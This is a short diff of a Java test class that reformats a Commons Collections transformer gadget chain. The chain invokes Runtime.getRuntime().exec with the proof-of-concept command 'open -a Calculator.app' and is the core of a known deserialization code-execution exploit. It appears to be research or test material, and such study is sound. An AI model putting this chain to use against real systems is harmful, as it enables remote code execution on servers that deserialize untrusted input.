@@ -24,15 +24,14 @@ public class CommonsCollectionsTest {
 
 	public static void main(String[] args) {
 		String cmd = "open -a Calculator.app";
+
 		Transformer[] transformers = new Transformer[]{
 				new ConstantTransformer(Runtime.class),
 				new InvokerTransformer("getMethod", new Class[]{
-						String.class, Class[].class}, new Object[]{
-						"getRuntime", new Class[0]}
+						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
 				),
 				new InvokerTransformer("invoke", new Class[]{
-						Object.class, Object[].class}, new Object[]{
-						null, new Object[0]}
+						Object.class, Object[].class}, new Object[]{null, new Object[0]}
 				),
 				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
 		};
